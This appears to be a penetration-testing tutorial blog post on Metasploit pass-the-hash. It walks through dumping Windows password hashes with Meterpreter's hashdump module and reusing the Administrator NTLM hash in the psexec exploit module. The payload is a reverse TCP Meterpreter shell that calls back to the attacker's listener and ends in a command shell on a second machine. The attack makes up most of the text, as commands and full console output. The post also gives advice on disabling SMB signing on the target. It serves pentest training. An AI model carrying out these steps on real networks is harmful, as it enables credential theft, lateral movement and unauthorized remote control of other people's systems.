---
draft: false
title: MSF PSexec Pass the Hash
weight: 230
linkTitle: PSexec Pass the Hash
translationKey: MSF_PSexec_Pass_the_Hash
date: 2017-05-25T13:17:00+03:00
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description: We will use the psexec module to pass the hash value to the target system.
url: /msf-psexec-pass-the-hash/
featured_image: /images/metasploit.jpg
categories:
   - Metasploit Framework
tags:
   - cybersecurity
   - metasploit framework
---
The psexec module is usually used during pentest operations. Thanks to this module, it becomes possible to log in to the target system. In normal use, it is enough to obtain the username and password of the system and enter them as a variable in the exploit module.

Normally, the path followed is to obtain the password with the `fgdump`, `pwdump` or `cachedump` commands when the meterpreter shell is opened on the system. If you find `hash` values ​​​​during these searches, we try to solve them using various tools and obtain the open form of the passwords.

However, sometimes you may encounter a different situation. You have opened an `Administrator` authorized session on a system and obtained the user's password formatted as `hash`. When you want to connect to another system on the same network through this system you logged in, you may not need to solve the password of the `Administrator` user. Usually, devices on the network communicate using these `hash` values. The psexec module allows you to use the `hash` value you find as a password.

WARNING-1:

In a system using NTLM, if the `hash` value you will find is in the format `******NOPASSWORD*******:8846f7eaee8fb117ad06bdd830b7586c`, you need to replace the `******NOPASSWORD*******` part at the beginning with 32 zeros and enter it as a variable in `psexec`. In other words, the value should be in the form `00000000000000000000000000000000000:8846f7eaee8fb117ad06bdd830b7586c`.

WARNING-2:

In a lab environment, if you receive the `STATUS_ACCESS_DENIED (Command=117 WordCount=0)` error even though you entered the correct hash value, you should set the `RequireSecuritySignature` value to `0` in the Registry settings of the target Windows system in `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters`.

## Hashdump

Below, a Meterpreter session has been opened using an exploit and the `post/windows/gather/hashdump` module is used to find hash values ​​in the system.

```bash
> Meterpreter session 1 opened (192.168.57.133:443 -> 192.168.57.131:1042)

meterpreter > run post/windows/gather/hashdump

> Obtaining the boot key...
> Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
> Obtaining the user list and keys...
> Decrypting user keys...
> Dumping password hashes...

Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
meterpreter >
```

As you can see, the `e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c` value belonging to the Administrator user at the IP address `RHOST: 192.168.57.131` has been obtained.

Now let's try to log in to the IP address `RHOST: 192.168.57.140` using this hash value. Of course, we assume that you discovered that the `SMB` service is running on the same network at the IP address `192.168.57.140` and port `445` in your previous scan.

## psexec

First, let's start Metasploit Framework with `msfconsole` and load the `psexec` module.

```bash
root@kali:~# msfconsole

                ##                          ###           ##    ##
 ##  ##  #### ###### ####  #####   #####    ##    ####        ######
####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##
####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##
## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##
##   ##  #### ###   #####   #####     ##   ####   ####   #### ###
                                      ##


       [ metasploit v4.2.0-dev [core:4.2 api:1.0]
+ -- --[ 787 exploits - 425 auxiliary - 128 post
+ -- --[ 238 payloads - 27 encoders - 8 nops
       [ svn r14551 updated yesterday (2012.01.14)

msf > search psexec

Exploits
**========**

   Name                       Description
   ----                       -----------
   windows/smb/psexec         Microsoft Windows Authenticated User Code Execution
   windows/smb/smb_relay      Microsoft Windows SMB Relay Code Execution

msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(psexec) > set LHOST 192.168.57.133
LHOST => 192.168.57.133
msf exploit(psexec) > set LPORT 443
LPORT => 443
msf exploit(psexec) > set RHOST 192.168.57.140
RHOST => 192.168.57.140
msf exploit(psexec) > show options

Module options:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    192.168.57.140   yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPass                   no        The password for the specified username
   SMBUser  Administrator    yes       The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique: seh, thread, process
   LHOST     192.168.57.133   yes       The local address
   LPORT     443              yes       The local port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
   ```

## SMBPass

As seen above, we need to enter the `SMBPass` variable in the `exploit/windows/smb/psexec` module. Let's enter the hash value we have in the `SMBPass` variable and run the module with the `exploit` command.

```bash
msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
SMBPass => e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
msf exploit(psexec) > exploit

> Connecting to the server...
> Started reverse handler
> Authenticating as user 'Administrator'...
> Uploading payload...
> Created \KoVCxCjx.exe...
> Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.57.140[\svcctl] ...
> Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.57.140[\svcctl] ...
> Obtaining a service manager handle...
> Creating a new service (XKqtKinn - "MSSeYtOQydnRPWl")...
> Closing service handle...
> Opening service...
> Starting the service...
>Removing the service...
> Closing service handle...
> Deleting \KoVCxCjx.exe...
> Sending stage (719360 bytes)
> Meterpreter session 1 opened (192.168.57.133:443 -> 192.168.57.140:445)

meterpreter > shell
Process 3680 created.
Channel 1 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32>
```

As you can see, a session has been opened at the IP address `192.168.57.140`.
